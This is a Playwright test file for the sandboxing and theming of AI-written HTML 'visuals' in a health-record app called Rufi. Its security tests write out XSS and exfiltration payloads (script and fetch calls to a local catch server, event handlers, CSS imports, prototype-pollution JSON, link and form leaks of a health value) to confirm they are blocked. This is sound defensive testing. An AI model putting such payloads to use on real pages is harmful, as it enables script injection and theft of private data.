// A reply's visual (ADR 0034), on the real core with its real headers: the
// AI's HTML in a `rufi-visual` block draws in its locked frame, in Rufi's
// theme and at its own height, waits while its block is written and never
// reloads as the reply goes on; it runs no script of its own and reaches
// neither the network nor Rufi's page; one that tries says part of it didn't
// load; and one that starts above what you read and grows keeps your place.
import { AxeBuilder } from "@axe-core/playwright";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import type { Frame, Locator, Page } from "@playwright/test";
import { expect, openSettings, test, type Rufi } from "./rufi.ts";

// The CSP's refusals in Rufi's own page.
test.beforeEach(async ({ context }) => {
  await context.addInitScript(() => {
    const refused: string[] = [];
    Object.assign(globalThis, { refused });
    (globalThis as unknown as EventTarget).addEventListener(
      "securitypolicyviolation",
      (event) => {
        const { violatedDirective, blockedURI } = event as Event & {
          violatedDirective: string;
          blockedURI: string;
        };
        refused.push(`${violatedDirective} ${blockedURI}`);
      },
    );
  });
});
const refusedIn = (page: Page) =>
  page.evaluate(() => (globalThis as unknown as { refused: string[] }).refused);

const chat = (page: Page) => page.getByRole("region", { name: "Chat" });
const log = (page: Page) => chat(page).getByRole("log", { name: "Messages" });
const cards = (page: Page) =>
  log(page).locator(".reply iframe[title='Visual']");

async function opened(
  page: Page,
  rufi: Rufi,
  options?: Parameters<Rufi["start"]>[0],
) {
  await rufi.family();
  await rufi.start(options);
  await page.goto(rufi.link());
  await expect(
    page.getByRole("heading", { name: "Health record" }),
  ).toBeVisible();
}

/** Sends a message; the scripted Codex answers "ok:" and the message. */
async function send(page: Page, text: string) {
  const opener = chat(page).getByRole("button", { name: "Open the chat" });
  const box = chat(page).getByRole("textbox", { name: "Message to Rufi" });
  await expect(opener.or(box).first()).toBeVisible();
  if (await opener.isVisible()) await opener.click();
  await box.fill(text);
  await box.press("Enter");
  await expect(box).toHaveValue("");
}

/** A reply with `html` as its visual, between two lines of text. */
const withVisual = (html: string, after = "As your record keeps it.") =>
  `Your HbA1c, drawn:\n\n\`\`\`rufi-visual\n${html}\n\`\`\`\n\n${after}`;

async function frameOf(card: Locator): Promise<Frame> {
  const frame = await (await card.elementHandle()).contentFrame();
  if (!frame) throw new Error("The visual has no frame.");
  return frame;
}

/** The colour Rufi's page gives `token` now, as a computed colour. */
const pageColour = (page: Page, token: string) =>
  page.evaluate((name) => {
    const probe = document.createElement("span");
    probe.style.color = `var(${name})`;
    document.body.append(probe);
    const colour = getComputedStyle(probe).color;
    probe.remove();
    return colour;
  }, token);

test("a visual draws in the reply in Rufi's theme at its own height, doesn't reload as the reply's text goes on, follows a new theme without reloading, and stays drawn once the reply ends", async ({
  page,
  rufi,
}) => {
  await opened(page, rufi);
  const chart = [
    '<div id="chart" style="height:300px;color:var(--ink)">',
    '<svg viewBox="0 0 100 50" width="100%"><circle cx="20" cy="25" r="5" fill="var(--accent)"/></svg>',
    "</div>",
  ].join("\n");
  // The reply streams in small parts: the text after the visual goes on
  // after the visual draws, paragraph by paragraph, well before it ends.
  const more = "These are the values your record keeps. ".repeat(15);
  // A source cited before the visual, defined at the reply's end.
  const after = `${more}halfway.\n\n${more}trickle end.\n\n[lab]: rufi:/documents/fictional-doc`;
  await send(
    page,
    withVisual(chart, after).replace(
      "Your HbA1c, drawn:",
      "Your HbA1c, drawn ([Sunrise Labs][lab]):",
    ),
  );
  const card = cards(page);
  const inside = page.frameLocator(".reply iframe[title='Visual']");
  await expect(inside.locator("circle")).toBeVisible({ timeout: 15_000 });
  // When the visual's document began: the same while it isn't reloaded.
  const began = async () =>
    (await frameOf(card)).evaluate(() => performance.timeOrigin);
  const loaded = await began();
  await expect(log(page).locator(".reply").getByText("halfway.")).toBeVisible();
  expect(await began()).toBe(loaded);
  // Once the reply ends, the visual is still drawn: its line may move in
  // the chat, and a frame the browser loads again gets it again.
  await expect(
    log(page).locator(".reply").getByText("trickle end."),
  ).toBeVisible();
  await expect(log(page)).toHaveAttribute("aria-busy", "false");
  await expect(inside.locator("circle")).toBeVisible();
  const ended = await began();
  // At its own height, with nothing to scroll inside.
  await expect
    .poll(() =>
      card.evaluate((element) => element.getBoundingClientRect().height),
    )
    .toBe(300);
  // In Rufi's colours.
  const ink = async () =>
    (await frameOf(card)).evaluate(
      () => getComputedStyle(document.getElementById("chart") as Element).color,
    );
  expect(await ink()).toBe(await pageColour(page, "--ink"));
  // The block shows as the visual, not as its code.
  await expect(log(page).locator(".reply pre")).toHaveCount(0);
  await expect(
    log(page).locator(".reply").getByText("Your HbA1c, drawn"),
  ).toBeVisible();
  // The reply is one document: the source is a link.
  await expect(
    log(page).locator(".reply").getByRole("link", { name: "Sunrise Labs" }),
  ).toHaveAttribute("href", /\/documents\/fictional-doc$/);

  // Dark: the same document takes the new colours.
  const light = await ink();
  await page.evaluate(() => {
    document.documentElement.dataset["appearance"] = "dark";
  });
  await expect.poll(ink).not.toBe(light);
  expect(await ink()).toBe(await pageColour(page, "--ink"));
  expect(await began()).toBe(ended);
  expect(await card.count()).toBe(1);

  await expect(
    log(page).getByText("Part of this visual didn't load"),
  ).toHaveCount(0);
  const { violations } = await new AxeBuilder({ page }).analyze();
  expect(violations.map((violation) => violation.id)).toEqual([]);
  expect(await refusedIn(page)).toEqual([]);
});

test("a visual still being written never shows its code: paragraph by paragraph it waits, word by word it holds its place quietly", async ({
  page,
  rufi,
}) => {
  await opened(page, rufi, {
    scenario: {
      answer: 'Here is your chart.\n\n```rufi-visual\n<p id="half">Half',
    },
  });
  await send(page, "partial");
  await expect(log(page).getByText("Here is your chart.")).toBeVisible();
  await expect(log(page).locator(".reply .visual")).toHaveCount(0);
  await expect(log(page).locator(".reply pre")).toHaveCount(0);
  await expect(log(page).getByText("Half")).toHaveCount(0);

  // Word by word, after a reload: the visual's place, quietly.
  const settings = await openSettings(page, "Chat");
  await settings.getByRole("radio", { name: "Word by word" }).check();
  await page.keyboard.press("Escape");
  await page.reload();
  const opener = chat(page).getByRole("button", { name: "Open the chat" });
  await expect(opener.or(log(page)).first()).toBeVisible();
  if (await opener.isVisible()) await opener.click();
  await expect(log(page).getByText("Here is your chart.")).toBeVisible();
  await expect(log(page).locator(".reply .visual[aria-hidden]")).toBeVisible();
  await expect(cards(page)).toHaveCount(0);
  await expect(log(page).locator(".reply pre")).toHaveCount(0);
  await expect(log(page).getByText("Half")).toHaveCount(0);
});

test("a visual runs no script of its own and reaches neither the network nor Rufi's page; one that tries says part of it didn't load", async ({
  page,
  rufi,
}) => {
  // Also in WebKit (the iPhone's engine), whose link hints connect whatever
  // a policy says.
  // Anything that reaches here got out, whatever it was.
  const reached: string[] = [];
  const outside: Server = createServer((request, response) => {
    reached.push(request.url ?? "");
    response.end("out");
  });
  // A connection counts, even one that never sends a request.
  outside.on("connection", () => reached.push("a connection"));
  await new Promise<void>((resolve) => outside.listen(0, "127.0.0.1", resolve));
  const out = `http://127.0.0.1:${String((outside.address() as AddressInfo).port)}`;
  try {
    await opened(page, rufi);
    // Rufi's own scripts, whose hashes the policy allows: the page's, the
    // card script and the visual's own.
    const response = await page.request.get(
      new URL("/visual-frame.html", page.url()).href,
    );
    const allowed = [
      ...(response.headers()["content-security-policy"] ?? "").matchAll(
        /'(sha256-[^']+)'/g,
      ),
    ].map((match) => match[1] ?? "");
    expect(allowed).toHaveLength(3);
    const own = allowed[0];
    const hostile = [
      '<p id="drawn">Drawn</p>',
      // As a model writes a chart: a library from a CDN, then its script.
      `<script src="${out}/chart.js"></script>`,
      // A file named by a hash the policy allows: its request would leave
      // before the file is checked.
      `<script src="${out}/values.js?hba1c=6.4" integrity="${own ?? ""}" crossorigin="anonymous"></script>`,
      `<svg><script href="${out}/drawn.js"></script></svg>`,
      `<script>document.body.dataset.ran = "yes"; fetch(${JSON.stringify(out)} + "/fetch");</script>`,
      '<img alt="" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onload="document.body.dataset.handler = \'yes\'">',
      `<img src="${out}/picture.png" alt="">`,
      `<link rel="stylesheet" href="${out}/style.css">`,
      `<link rel="prefetch" href="${out}/prefetch">`,
      `<link rel="preconnect" href="${out}">`,
      `<link rel="dns-prefetch" href="${out}">`,
      `<link rel="preload" as="script" href="${out}/preloaded.js" integrity="${own ?? ""}">`,
      `<object data="${out}/object"></object><embed src="${out}/embed">`,
      `<base href="${out}/">`,
      `<meta http-equiv="refresh" content="0;url=${out}/moved">`,
      `<style>@import url("${out}/imported.css"); #drawn { background: url("${out}/background.png"); }</style>`,
      `<iframe src="${out}/framed"></iframe>`,
      `<form action="${out}/form" method="post"><button id="post">Post</button></form>`,
      // Links: a visual has none. Their words stay.
      `<a href="${out}/followed" target="_top"><span id="away">Away</span></a>`,
      `<a href="${out}/values?hba1c=6.4" target="_blank"><span id="blank">View values</span></a>`,
      `<a href="/visual-frame.html?hba1c=6.4"><span id="own">Chart</span></a>`,
      `<a href="/api/people?hba1c=6.4"><span id="api">Values</span></a>`,
      `<svg width="40" height="20"><a href="${out}/drawn-link"><text id="svg-link" y="15">Dot</text></a></svg>`,
      `<img id="mapped" usemap="#map" width="20" height="20" alt="" src="data:image/gif;base64,R0lGODlhAQABAAAAACw="><map name="map"><area shape="rect" coords="0,0,20,20" href="${out}/area?hba1c=6.4" target="_blank" alt="Area"></map>`,
    ].join("\n");
    // Rufi's own address, reached from the visual with a value.
    const toRufi: string[] = [];
    page.on("request", (request) => {
      const { origin, search } = new URL(request.url());
      if (origin === new URL(page.url()).origin && search.includes("hba1c=")) {
        toRufi.push(request.url());
      }
    });
    await send(page, withVisual(hostile));
    const inside = page.frameLocator(".reply iframe[title='Visual']");
    await expect(inside.getByText("Drawn")).toBeVisible();
    await expect(
      log(page).getByText("Part of this visual didn't load"),
    ).toBeVisible();

    // None of the AI's script ran, and the visual has nothing of Rufi's
    // page, session or storage.
    const frame = await frameOf(cards(page));
    expect(
      await frame.evaluate(() => {
        const tried = (what: () => unknown) => {
          try {
            return String(what());
          } catch {
            return "refused";
          }
        };
        return {
          ran: document.body.dataset["ran"] ?? "no",
          handler: document.body.dataset["handler"] ?? "no",
          page: tried(() => window.parent.document.title),
          cookie: tried(() => document.cookie),
          storage: tried(() => localStorage.length),
        };
      }),
    ).toEqual({
      ran: "no",
      handler: "no",
      page: "refused",
      cookie: "refused",
      storage: "refused",
    });
    // A form or a link in it goes nowhere: its links are words only.
    await expect(inside.locator("a, area")).toHaveCount(0);
    await inside.locator("#post").click();
    // Rufi's own addresses last: were they links, the frame would leave.
    for (const words of [
      "#away",
      "#blank",
      "#svg-link",
      "#mapped",
      "#own",
      "#api",
    ]) {
      await inside.locator(words).click();
    }

    // The second policy on its own: a script file named by any hash the
    // first allows, put in past the markup's guard, still never loads.
    await frame.evaluate(
      ({ out, allowed }) => {
        allowed.forEach((hash, i) => {
          const file = document.createElement("script");
          file.src = `${out}/active-${String(i)}.js?hba1c=6.4`;
          file.integrity = hash;
          file.crossOrigin = "anonymous";
          document.body.append(file);
        });
      },
      { out, allowed },
    );
    await page.waitForTimeout(1000);

    expect(reached).toEqual([]);
    expect(toRufi).toEqual([]);
    expect(page.context().pages()).toHaveLength(1);
    await expect(
      page.getByRole("heading", { name: "Health record" }),
    ).toBeVisible();
    // Rufi's page refused only a frame's move.
    for (const refusal of await refusedIn(page)) {
      expect(refusal).toMatch(/^frame-src /);
    }
  } finally {
    outside.closeAllConnections();
    await new Promise((resolve) => outside.close(resolve));
  }
});

test("Tailwind in a visual reaches neither the network nor Rufi's page: the browser refuses each import and web address it writes, and Tailwind refuses a plugin", async ({
  page,
  rufi,
}) => {
  // Also in WebKit. Tailwind writes a web import or a class's url() into
  // the CSS it makes, and the frame's policy refuses it: each probe waits
  // for the browser's refusal of its own address, so it proves the browser
  // tried. An import is valid only before Rufi's theme, so the test puts
  // each import's input there, past the markup's guard; a visual's own
  // import comes after the theme, where the browser ignores it.
  const reached: string[] = [];
  const outside: Server = createServer((request, response) => {
    reached.push(request.url ?? "");
    response.end("out");
  });
  outside.on("connection", () => reached.push("a connection"));
  await new Promise<void>((resolve) => outside.listen(0, "127.0.0.1", resolve));
  const out = `http://127.0.0.1:${String((outside.address() as AddressInfo).port)}`;
  // Rufi's own address, reached from the visual with a value. Chromium
  // also tells of a request its policy refused, so only one that got an
  // answer counts.
  const toRufi: string[] = [];
  page.on("requestfinished", (request) => {
    const { origin, search } = new URL(request.url());
    if (origin === new URL(page.url()).origin && search.includes("hba1c=")) {
      toRufi.push(request.url());
    }
  });
  try {
    await opened(page, rufi);
    const own = new URL(page.url()).origin;
    // Each in its own visual, so one that stops Tailwind can't keep
    // another from being reached.
    const probes: { words: string; input?: string; classes?: string }[] = [
      { words: "Imported", input: `@import "${out}/tw-import.css?hba1c=6.4";` },
      { words: "Imported by url", input: `@import url("${out}/tw-url.css");` },
      {
        words: "Imported from Rufi",
        input: `@import "${own}/tw-own.css?hba1c=6.4";`,
      },
      {
        words: "Classes",
        classes: `bg-[url(${out}/tw-background.png)] [mask-image:url(${own}/tw-mask.png?hba1c=6.4)]`,
      },
    ];
    const refusedFor = [
      [`${out}/tw-import.css?hba1c=6.4`],
      [`${out}/tw-url.css`],
      [`${own}/tw-own.css?hba1c=6.4`],
      [`${out}/tw-background.png`, `${own}/tw-mask.png?hba1c=6.4`],
    ];
    for (const { words } of probes) {
      await send(page, withVisual(`<p id="probe">${words}</p>`));
    }
    // A plugin, in the visual's own Tailwind.
    await send(
      page,
      withVisual(
        `<p id="probe">Plugin</p><style type="text/tailwindcss">@plugin "${out}/tw-plugin.js";</style>`,
      ),
    );
    await expect(cards(page)).toHaveCount(probes.length + 1);
    for (const [at, probe] of probes.entries()) {
      const card = cards(page).nth(at);
      await expect(
        card.contentFrame().getByText(probe.words, { exact: true }),
      ).toBeVisible({ timeout: 15_000 });
      const frame = await frameOf(card);
      await frame.evaluate(({ input, classes }) => {
        const refused: string[] = [];
        (window as unknown as { refused: string[] }).refused = refused;
        addEventListener("securitypolicyviolation", (event) =>
          refused.push(event.blockedURI),
        );
        if (input !== undefined) {
          const style = document.createElement("style");
          style.setAttribute("type", "text/tailwindcss");
          style.textContent = input;
          document
            .querySelector('style[type="text/tailwindcss"]')
            ?.before(style);
        }
        if (classes !== undefined) {
          (document.getElementById("probe") as Element).className = classes;
        }
      }, probe);
      for (const address of refusedFor[at] ?? []) {
        await expect
          .poll(() =>
            frame.evaluate(
              () => (window as unknown as { refused: string[] }).refused,
            ),
          )
          .toContain(address);
      }
    }
    // The class's addresses reached what the probe's style is.
    const classes = await frameOf(cards(page).nth(3));
    expect(
      await classes.evaluate(() => {
        const style = getComputedStyle(
          document.getElementById("probe") as Element,
        );
        return [
          style.backgroundImage,
          style.getPropertyValue("mask-image") ||
            style.getPropertyValue("-webkit-mask-image"),
        ];
      }),
    ).toEqual([
      expect.stringContaining("tw-background.png"),
      expect.stringContaining("tw-mask.png"),
    ]);
    // Tailwind itself refuses the plugin: it loads no module at all.
    const plugin = cards(page).nth(probes.length);
    await expect(
      plugin.contentFrame().getByText("Plugin", { exact: true }),
    ).toBeVisible({ timeout: 15_000 });
    const pluginFrame = await frameOf(plugin);
    await expect
      .poll(() =>
        pluginFrame.evaluate(() =>
          performance
            .getEntriesByName("(error)")
            .map((mark) =>
              String(
                ((mark as PerformanceMark).detail as { error?: unknown } | null)
                  ?.error,
              ),
            ),
        ),
      )
      .toContain(
        "Error: The browser build does not support plugins or config files.",
      );
    await page.waitForTimeout(1000);
    expect(reached).toEqual([]);
    expect(toRufi).toEqual([]);
  } finally {
    outside.closeAllConnections();
    await new Promise((resolve) => outside.close(resolve));
  }
});

test("a visual is styled with Tailwind in Rufi's theme: any class, the screens' colour names, no colours of Tailwind's own, and dark as Rufi is", async ({
  page,
  rufi,
}) => {
  await opened(page, rufi);
  await send(
    page,
    withVisual(
      [
        '<div class="p-4 rounded-lg border border-line bg-surface">',
        '<p id="small" class="text-sm text-muted">Small</p>',
        '<div id="grid" class="grid grid-cols-[1fr_auto] gap-2"><span>Date</span><span>Value</span></div>',
        '<p id="red" class="bg-red-500 text-red-600">Red</p>',
        '<p id="dark" class="text-ink dark:text-accent">Dark</p>',
        "</div>",
      ].join(""),
    ),
  );
  const card = cards(page);
  await expect(
    page.frameLocator(".reply iframe[title='Visual']").getByText("Dark"),
  ).toBeVisible({ timeout: 15_000 });
  const frame = await frameOf(card);
  const style = (id: string, property: string) =>
    frame.evaluate(
      ({ id, property }) =>
        getComputedStyle(
          document.getElementById(id) as Element,
        ).getPropertyValue(property),
      { id, property },
    );
  // Tailwind builds after the visual is in, any class the AI writes: wait
  // for an arbitrary value's.
  await expect
    .poll(async () => (await style("grid", "grid-template-columns")).split(" "))
    .toHaveLength(2);
  // Rufi's colours by the screens' names; Tailwind's own have none.
  expect(await style("small", "color")).toBe(await pageColour(page, "--muted"));
  expect(await style("red", "background-color")).toBe("rgba(0, 0, 0, 0)");
  expect(await style("red", "color")).toBe(await pageColour(page, "--ink"));
  expect(await style("dark", "color")).toBe(await pageColour(page, "--ink"));
  // Dark is Rufi's, not the system's.
  await page.evaluate(() => {
    document.documentElement.dataset["appearance"] = "dark";
  });
  await expect
    .poll(() => style("dark", "color"))
    .toBe(await pageColour(page, "--accent"));
  await expect(
    log(page).getByText("Part of this visual didn't load"),
  ).toHaveCount(0);
});

/** A chart's JSON block, as the AI writes it where the chart goes. */
const chartBlock = (config: unknown, label?: string) =>
  `<script type="application/json" data-rufi-chart${label === undefined ? "" : ` aria-label="${label}"`}>${JSON.stringify(config)}</script>`;

/** What a visual's chart is, read in its frame through Rufi's Chart.js. */
interface Drawn {
  type: string;
  xs: number[];
  colours: unknown[];
  shapes: unknown[];
  textColour: unknown;
  gridColour: unknown;
  fontSize: unknown;
  label: string | null;
}
const drawnIn = (frame: Frame) =>
  frame.evaluate((): Drawn | undefined => {
    const visual = (
      window as unknown as {
        rufiVisual?: {
          Chart: {
            getChart: (canvas: HTMLCanvasElement) =>
              | {
                  config: { type: string };
                  options: { font: { size: unknown } };
                  scales: Record<
                    string,
                    {
                      options: {
                        ticks: { color: unknown };
                        grid: { color: unknown };
                      };
                    }
                  >;
                  data: { datasets: Record<string, unknown>[] };
                  getDatasetMeta: (index: number) => {
                    data: { x: number }[];
                  };
                }
              | undefined;
          };
        };
      }
    ).rufiVisual;
    const canvas = document.querySelector("canvas");
    const chart = canvas ? visual?.Chart.getChart(canvas) : undefined;
    const y = chart?.scales["y"];
    if (!visual || !canvas || !chart || !y) return undefined;
    return {
      type: chart.config.type,
      xs: chart.getDatasetMeta(0).data.map((point) => point.x),
      colours: chart.data.datasets.map((dataset) => dataset["borderColor"]),
      shapes: chart.data.datasets.map((dataset) => dataset["pointStyle"]),
      textColour: y.options.ticks.color,
      gridColour: y.options.grid.color,
      fontSize: chart.options.font.size,
      label: canvas.getAttribute("aria-label"),
    };
  });

/** The theme's variable in the visual, as its CSS has it. */
const variableIn = (frame: Frame, name: string) =>
  frame.evaluate(
    (name) =>
      getComputedStyle(document.documentElement).getPropertyValue(name).trim(),
    name,
  );

test("a visual's chart is drawn by Rufi from its JSON: spaced by date, a tooltip of the record's own words, series told apart, and a new theme without reloading", async ({
  page,
  rufi,
}) => {
  await opened(page, rufi);
  const tsh = [
    { x: "2025-03", y: 2.1, text: "2.1 mIU/L" },
    { x: "2025-09-14", y: 0.5, text: "<0.5 mIU/L" },
    { x: "2026-01-20", y: 3, text: "3.0 mIU/L" },
    // No value as printed: no tooltip.
    { x: "2026-08-12", y: 4.6 },
  ];
  await send(
    page,
    withVisual(
      [
        '<p id="words">TSH over time</p>',
        chartBlock(
          {
            type: "line",
            data: {
              datasets: [
                { label: "TSH", data: tsh },
                {
                  label: "Free T4",
                  data: [{ x: "2025-03", y: 1.1, text: "1.1 ng/dL" }],
                },
              ],
            },
            options: { scales: { x: { type: "time" } } },
          },
          "TSH over time",
        ),
      ].join(""),
    ),
  );
  const card = cards(page);
  await expect(
    page
      .frameLocator(".reply iframe[title='Visual']")
      .getByText("TSH over time"),
  ).toBeVisible({ timeout: 15_000 });
  const frame = await frameOf(card);
  await expect.poll(async () => (await drawnIn(frame))?.type).toBe("line");
  const drawn = await drawnIn(frame);
  // Spaced by date: 1 Mar to 14 Sep 2025 is 197 days, to 20 Jan 2026 128.
  const [a = 0, b = 0, c = 0] = drawn?.xs ?? [];
  expect((b - a) / (c - b)).toBeCloseTo(197 / 128, 1);
  // Its words for a screen reader are the AI's.
  expect(drawn?.label).toBe("TSH over time");
  // In Rufi's colours, each series its own colour and shape.
  expect(drawn?.colours).toEqual([
    await variableIn(frame, "--ink"),
    await variableIn(frame, "--accent"),
  ]);
  expect(drawn?.shapes).toEqual(["circle", "triangle"]);
  expect(drawn?.textColour).toBe(await variableIn(frame, "--muted"));
  expect(drawn?.gridColour).toBe(await variableIn(frame, "--line"));

  // The tooltip, as a pointer brings it: the date as written, at its
  // precision, and the value as printed; none for a point with no value.
  const tooltipAt = async (point: number) => {
    const at = await frame.evaluate((point) => {
      const visual = (
        window as unknown as {
          rufiVisual: {
            Chart: {
              getChart: (canvas: HTMLCanvasElement) => {
                getDatasetMeta: (index: number) => {
                  data: { x: number; y: number }[];
                };
              };
            };
          };
        }
      ).rufiVisual;
      const canvas = document.querySelector("canvas") as HTMLCanvasElement;
      const spot = visual.Chart.getChart(canvas).getDatasetMeta(0).data[point];
      const box = canvas.getBoundingClientRect();
      return { x: box.left + (spot?.x ?? 0), y: box.top + (spot?.y ?? 0) };
    }, point);
    const frameBox = await card.boundingBox();
    await page.mouse.move((frameBox?.x ?? 0) + at.x, (frameBox?.y ?? 0) + at.y);
    return frame.evaluate(() => {
      const visual = (
        window as unknown as {
          rufiVisual: {
            Chart: {
              getChart: (canvas: HTMLCanvasElement) => {
                tooltip: {
                  title: string[];
                  body: { lines: string[] }[];
                  dataPoints: unknown[];
                };
              };
            };
          };
        }
      ).rufiVisual;
      const tooltip = visual.Chart.getChart(
        document.querySelector("canvas") as HTMLCanvasElement,
      ).tooltip;
      return tooltip.dataPoints.length === 0
        ? null
        : {
            title: tooltip.title,
            body: tooltip.body.flatMap((part) => part.lines),
          };
    });
  };
  await expect
    .poll(() => tooltipAt(1))
    .toEqual({
      title: ["14 Sep 2025"],
      body: ["TSH: <0.5 mIU/L"],
    });
  await expect.poll(() => tooltipAt(3)).toBeNull();

  // A new theme: dark, another colour, a bigger text size; the chart takes
  // it without reloading.
  const began = await frame.evaluate(() => performance.timeOrigin);
  const before = await drawnIn(frame);
  await page.evaluate(() => {
    document.documentElement.dataset["appearance"] = "dark";
    document.documentElement.dataset["colour"] = "plum";
    document.documentElement.dataset["textSize"] = "larger";
  });
  await expect
    .poll(async () => (await drawnIn(frame))?.colours)
    .not.toEqual(before?.colours);
  await expect
    .poll(async () => (await drawnIn(frame))?.colours)
    .toEqual([
      await variableIn(frame, "--ink"),
      await variableIn(frame, "--accent"),
    ]);
  expect((await drawnIn(frame))?.textColour).toBe(
    await variableIn(frame, "--muted"),
  );
  expect((await drawnIn(frame))?.gridColour).toBe(
    await variableIn(frame, "--line"),
  );
  expect(Number((await drawnIn(frame))?.fontSize)).toBeGreaterThan(
    Number(before?.fontSize),
  );
  expect(await frame.evaluate(() => performance.timeOrigin)).toBe(began);
  await expect(
    log(page).getByText("Part of this visual didn't load"),
  ).toHaveCount(0);
});

test("a visual's chart JSON reaches neither the network nor Rufi's page: nothing in it runs, and a chart Rufi can't draw says part of it didn't load", async ({
  page,
  rufi,
}) => {
  // Also in WebKit. Each in its own visual, so one that fails can't keep
  // another from being reached.
  const reached: string[] = [];
  const outside: Server = createServer((request, response) => {
    reached.push(request.url ?? "");
    response.end("out");
  });
  outside.on("connection", () => reached.push("a connection"));
  await new Promise<void>((resolve) => outside.listen(0, "127.0.0.1", resolve));
  const out = `http://127.0.0.1:${String((outside.address() as AddressInfo).port)}`;
  // Rufi's own address, answered for the visual with a value.
  const toRufi: string[] = [];
  page.on("requestfinished", (request) => {
    const { origin, search } = new URL(request.url());
    if (origin === new URL(page.url()).origin && search.includes("hba1c=")) {
      toRufi.push(request.url());
    }
  });
  const ran = "document.body.dataset.ran = 'yes'";
  const point = { x: "2026-01-01", y: 1, text: "1" };
  try {
    await opened(page, rufi);
    const own = new URL(page.url()).origin;
    const probes: [string, string][] = [
      [
        "Not JSON",
        '<script type="application/json" data-rufi-chart>{"type": "line",</script>',
      ],
      [
        "A pie",
        chartBlock({ type: "pie", data: { datasets: [{ data: [1, 2] }] } }),
      ],
      [
        "Markup",
        `<script type="application/json" data-rufi-chart>{"type":"bar","data":{"labels":["<img src=x onerror=\\"${ran}\\">","</script><img src="${out}/after.png" alt="">"],"datasets":[{"label":"<b>bold</b>","data":[1,2]}]}}</script>`,
      ],
      [
        "Callbacks",
        chartBlock({
          type: "line",
          data: { datasets: [{ label: "x", data: [point] }] },
          options: {
            plugins: {
              tooltip: { callbacks: { label: ran, title: ran } },
              legend: { onClick: ran },
            },
            scales: { x: { type: "time" }, y: { ticks: { callback: ran } } },
            onHover: ran,
          },
        }),
      ],
      [
        "Prototype",
        `<script type="application/json" data-rufi-chart>{"type":"line","data":{"datasets":[{"label":"p","data":[{"x":1,"y":1,"text":"1"}],"__proto__":{"polluted":"yes"}}]},"options":{"__proto__":{"polluted":"yes"},"plugins":{"constructor":{"prototype":{"polluted":"yes"}},"tooltip":{"__proto__":{"polluted":"yes"}}}}}</script>`,
      ],
      [
        "Plugins",
        chartBlock({
          type: "line",
          data: { datasets: [{ label: "x", data: [point] }] },
          options: { scales: { x: { type: "time" } } },
          plugins: [{ id: "mine", beforeDraw: ran, afterDraw: ran }],
        }),
      ],
      [
        "Addresses",
        chartBlock({
          type: "line",
          data: {
            datasets: [
              {
                label: `${out}/label`,
                data: [point],
                backgroundColor: `url(${out}/fill.png)`,
              },
            ],
          },
          options: {
            scales: { x: { type: "time" } },
            plugins: {
              title: { display: true, text: `${out}/title` },
              legend: {
                labels: { font: { family: `url(${own}/font.woff?hba1c=6.4)` } },
              },
            },
            font: { family: `url(${out}/font.woff)` },
          },
        }),
      ],
    ];
    for (const [words, block] of probes) {
      await send(page, withVisual(`<p id="words">${words}</p>${block}`));
    }
    await expect(cards(page)).toHaveCount(probes.length);
    for (const [at, [words]] of probes.entries()) {
      const card = cards(page).nth(at);
      // Its words still show.
      await expect(
        card.contentFrame().getByText(words, { exact: true }),
      ).toBeVisible({ timeout: 15_000 });
      // A pointer over it and a tap: whatever its tooltip and legend call
      // runs now.
      await card.scrollIntoViewIfNeeded();
      const box = await card.boundingBox();
      if (box) {
        await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
        await page.mouse.click(box.x + 40, box.y + box.height / 2);
      }
    }
    // Nothing of the JSON ran, and nothing was polluted.
    for (const at of probes.keys()) {
      const frame = await frameOf(cards(page).nth(at));
      expect(
        await frame.evaluate(() => ({
          ran: document.body.dataset["ran"] ?? "no",
          polluted: "polluted" in {},
          images: document.querySelectorAll("img[onerror]").length,
        })),
      ).toEqual({ ran: "no", polluted: false, images: 0 });
    }
    // Not JSON, a type Rufi doesn't draw, and JSON cut short by a closing
    // tag each say so under the visual.
    await expect
      .poll(() =>
        log(page).getByText("Part of this visual didn't load").count(),
      )
      .toBeGreaterThanOrEqual(3);
    await page.waitForTimeout(1000);
    expect(reached).toEqual([]);
    expect(toRufi).toEqual([]);
    expect(page.context().pages()).toHaveLength(1);
  } finally {
    outside.closeAllConnections();
    await new Promise((resolve) => outside.close(resolve));
  }
});

test("a visual that starts above what you read and grows keeps your place", async ({
  page,
  rufi,
}) => {
  await opened(page, rufi);
  await send(page, withVisual('<div style="height:120px"></div>'));
  const card = cards(page);
  await expect
    .poll(() =>
      card.evaluate((element) => element.getBoundingClientRect().height),
    )
    .toBe(120);
  await send(
    page,
    `Further words. ${"A plain line of made-up words. ".repeat(120)}`,
  );
  const reading = log(page).locator(".reply").getByText("Further words.");
  await expect(reading).toBeVisible();

  // Read further down: the visual starts 40 px above the view, far from
  // the end. (A frame wholly out of view isn't drawn, so it reports no
  // change until it shows.)
  await card.evaluate((element) => {
    let scroller = element.parentElement;
    while (scroller && getComputedStyle(scroller).overflowY !== "auto") {
      scroller = scroller.parentElement;
    }
    if (!scroller) throw new Error("No scrolling area.");
    scroller.scrollTop +=
      element.getBoundingClientRect().top -
      scroller.getBoundingClientRect().top +
      40;
  });
  const at = () =>
    reading.evaluate((element) =>
      Math.round(element.getBoundingClientRect().top),
    );
  const before = await at();
  // The visual grows by 200 px.
  await (
    await frameOf(card)
  ).evaluate(() => {
    const more = document.createElement("div");
    more.style.height = "200px";
    document.body.append(more);
  });
  await expect
    .poll(() =>
      card.evaluate((element) => element.getBoundingClientRect().height),
    )
    .toBe(320);
  expect(await at()).toBe(before);
});
